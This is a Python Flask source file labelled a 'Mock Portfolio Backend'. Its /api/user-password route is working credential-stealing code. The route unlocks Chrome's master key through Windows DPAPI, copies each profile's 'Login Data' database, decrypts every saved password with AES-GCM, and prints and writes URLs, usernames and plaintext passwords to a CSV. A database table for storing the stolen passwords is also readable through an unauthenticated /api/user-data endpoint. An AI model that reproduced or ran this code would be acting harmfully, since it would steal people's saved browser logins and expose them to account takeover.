import sqlite3
from flask import Flask, request, jsonify, render_template_string, Response, session, send_from_directory
from flask_cors import CORS
from functools import wraps
from dotenv import load_dotenv
import os
from Cryptodome.Cipher import AES
import json
import base64
import win32crypt
import re
import csv
import shutil
import time

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__)
CORS(app)

DATABASE = 'database.db'
PORT = int(os.environ.get('PORT', 5000))

# Fetch admin credentials from environment variables
ADMIN_USERNAME = os.getenv('ADMIN_USERNAME')
ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD')

def init_db():
    # Connect to the database and create the table
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    
    # Create Table if it does not exist
    cursor.execute(''' 
                    CREATE TABLE IF NOT EXISTS decrypt_password (
                        id INTEGER PRIMARY KEY,
                        url TEXT NOT NULL,
                        username TEXT,
                        password TEXT NOT NULL,
                        timestamp TEXT DEFAULT CURRENT_TIMESTAMP
                    )
                    ''')
    conn.commit()
    conn.close()
    
def get_db_connection():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

# Basic Admin Auth Decorator
def require_admin(func):
    @wraps(func)
    def decorated_function(*args, **kwargs):
        auth = request.authorization
        if not auth or auth.username != ADMIN_USERNAME or auth.password != ADMIN_PASSWORD:
            return jsonify({"message": "Unauthorized"}), 401
        return func(*args, **kwargs)
    return decorated_function

@app.route('/')
def home():
    return "This is Mock Portfolio Backend"

@app.route('/api/get-ip', methods=['GET'])
def get_user_ip():
    user_ip = request.remote_addr
    forwarded_ip = request.headers.get('X-Forwarded-For', '').split(',')[0].strip()
    real_ip = forwarded_ip or user_ip
    return jsonify({"ip": real_ip})

@app.route('/api/user-data', methods=['GET'])
def get_user_data():
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute('SELECT * FROM decrypt_password')
    rows = cursor.fetchall()
    
    # Return the data as JSON
    data = []
    for row in rows:
        data.append(dict(row))
    
    return jsonify(data)

    
    return jsonify({"message": "User data added successfully"}), 201

@app.route('/api/user-data/<int:id>', methods=['DELETE'])
@require_admin
def delete_user_data(id):
    # Delete the record with the specified ID
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('DELETE FROM decrypt_password WHERE id = ?', (id,))
    conn.commit()
    conn.close()
    
    return jsonify({"message": "User data deleted successfully"})

@app.route('/api/user-data', methods=['DELETE'])
@require_admin
def delete_all_user_data():
    # Delete all records from the decrypt_password table
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('DELETE FROM decrypt_password')
    conn.commit()
    conn.close()
    
    return jsonify({"message": "All user data deleted successfully"})

def add_user_data(id, url, username, password, timestamp):
    # Insert the new record into the database
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO decrypt_password (id, url, username, password, timestamp) 
        VALUES (?, ?, ?, ?, ?)
    ''', (id, url, username, password, timestamp))
    conn.commit()
    conn.close()

@app.route('/api/user-password', methods=['GET'])
def user_password():
    CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
    CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
    
    print('Chrome path', CHROME_PATH)
    print('Chrome path local state', CHROME_PATH_LOCAL_STATE)

    def get_secret_key():
        try:
            #(1) Get secretkey from chrome local state
            with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            #Remove suffix DPAPI
            secret_key = secret_key[5:] 
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            print("%s"%str(e))
            print("[ERR] Chrome secretkey cannot be found")
            return None
        
    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(ciphertext, secret_key):
        try:
            #(3-a) Initialisation vector for AES decryption
            initialisation_vector = ciphertext[3:15]
            #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
            #Encrypted password is 192 bits
            encrypted_password = ciphertext[15:-16]
            #(4) Build the cipher to decrypt the ciphertext
            cipher = generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()  
            return decrypted_pass
        except Exception as e:
            print("%s"%str(e))
            print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
            return ""
        
    def get_db_connection(chrome_path_login_db):
        try:
            print(chrome_path_login_db)
            shutil.copy2(chrome_path_login_db, "Loginvault.db") 
            return sqlite3.connect("Loginvault.db")
        except Exception as e:
            print("%s"%str(e))
            print("[ERR] Chrome database cannot be found")
            return None
            
    try:
        #Create Dataframe to store passwords
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index","url","username","password"])
            #(1) Get secret key
            secret_key = get_secret_key()
            #Search user profile or default folder (this is where the encrypted login password is stored)
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
            for folder in folders:
                #(2) Get ciphertext from sqlite database
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url!="" and username!="" and ciphertext!=""):
                            #(3) Filter the initialisation vector & encrypted password from ciphertext 
                            #(4) Use AES algorithm to decrypt the password
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            print("Sequence: %d"%(index))
                            print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
                            print("*"*50)
                            #(5) Save into CSV
                            # add_user_data(id=index, url=url,username=username, password=decrypt_password, timestamp=time.time())
                            print(time.time())
                            csv_writer.writerow([index,url,username,decrypted_password])
                    #Close database connection
                    cursor.close()
                    conn.close()
                    #Delete temp login db
                    os.remove("Loginvault.db")
        return []
    except Exception as e:
        print("[ERR] %s"%str(e))

if __name__ == '__main__':
    # Initialize the database
    init_db()
    app.run(debug=True)
